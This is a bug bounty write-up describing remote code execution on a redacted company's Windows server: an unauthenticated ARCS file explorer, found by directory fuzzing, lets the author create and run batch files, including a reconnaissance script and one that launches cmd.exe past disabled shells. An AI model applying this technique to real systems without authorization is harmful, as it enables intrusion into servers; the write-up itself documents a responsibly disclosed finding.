---
title: [$7,500] Remote Code Execution
date: 2021/3/19
description: Bug Bounty write-up
tag: web-security
author: You
---

# How I scored a 7,500$ Bounty in just 7.5 Mins?

Tools Used - [ffuf](https://github.com/ffuf/ffuf), 🧠

**P.S. Due to Security Policy & Responsible Disclosure, The Company name is being redacted in this Blog Post.**

While fuzzing directories using ffuf, I found an unauthed Directory `/launcharcs/`; It was running an ARCS Instance on a Windows Server.

- The page greeted me with a Sign-In tab - But, A Settings button on the bottom left corner allows Frame Explorer (File Explorer) to be run by any un-auth user (Auth Bypass? :P).
![fram_exp](https://raw.githubusercontent.com/anishatlpu/portfolio/main/public/images/tets1.png)
This already allowed me to access files stored in the `D:/` Drive, Which were mostly System Logs/Information - Let's Escalate this to Code execution, Shall We?

As `Command Prompt` and `PowerShell` were disabled for obvious security reasons - There's no direct way to ping my Server . . . 

Although, We were allowed to Create, Delete and Rename files/folder in the Desktop `C:/`.


- So, I created a Text file in the Desktop `sysinfo.bat`.

```
@ECHO OFF 
:: This batch file reveals OS, hardware, and networking configuration.
TITLE My System Info
ECHO Please wait... Checking system information.
:: Section 1: OS information.
ECHO ============================
ECHO OS INFO
ECHO ============================
systeminfo | findstr /c:"OS Name"
systeminfo | findstr /c:"OS Version"
systeminfo | findstr /c:"System Type"
:: Section 2: Hardware information.
ECHO ============================
ECHO HARDWARE INFO
ECHO ============================
systeminfo | findstr /c:"Total Physical Memory"
wmic cpu get name
:: Section 3: Networking information.
ECHO ============================
ECHO NETWORK INFO
ECHO ============================
ipconfig | findstr IPv4
ipconfig | findstr IPv6
PAUSE
```
- Saved and ran the text file with `.bat` extension.

![sysinfo](https://raw.githubusercontent.com/anishatlpu/portfolio/main/public/images/sysinfo.PNG)


This was enough to show the P1 Severity Impact, Just to put some cherry on top - I wrote this another script to run cmd in the Local Machine.


```
@echo off
echo run Command Prompt.
pause
cls
%SystemRoot%\system32\cmd.exe
pause
```

The _Redacted Company_ acted quick on this and Rewarded me a sweet 7,500$ Bounty :).
![yay](https://c.tenor.com/5987hNPhX_EAAAAM/dance-cute.gif)

![bounty](https://raw.githubusercontent.com/anishatlpu/portfolio/main/public/images/Screenshot%202021-12-11%20084638.png)

Thank You _Redated Company_ for the Bounty! - And I really appreciate you for reading till the end 🥰.


Anish

